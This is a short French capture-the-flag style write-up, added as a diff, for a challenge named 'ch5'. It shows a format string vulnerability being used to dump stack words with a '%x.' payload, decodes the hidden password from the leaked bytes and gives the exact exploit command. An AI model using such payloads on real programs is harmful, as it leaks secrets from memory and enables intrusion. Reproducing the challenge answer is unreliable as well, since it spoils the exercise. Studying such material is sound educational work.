@@ -1,0 +1,14 @@
+Il faut lire ce qui precede dans la stack (les addresses au-dessus de ebp), avec une comparaison avec un mot de passe connu, on peut facilement determiner ou se trouvent les octets qui nous interessent et comment les lire:
+
+avec ABCDEFGHIJKLMNO:
+20.804b008.b7fceff4.8048570.8049ff4.2.bffffce4.b7fcf3e4.d.804b008.44434241.48474645.4c4b4a49.0a4f4e4d.b7e5ce00.b7fed230.0.8048579.504cb200.8048570.
+
+ch5:
+20.804b008.b7fceff4.8048570.8049ff4.2.bffffce4.b7fcf3e4.d.804b008.39617044.28293664.6d617045.b7000a64.b7e5ce65.b7fed230.0.8048579.a6318900.8048570.
+
+on a donc:
+39617044.28293664.6d617045.64
+
+-> Dpa9d6)(Epamd
+
+./ch5 `python -c 'print "%x."*20'`
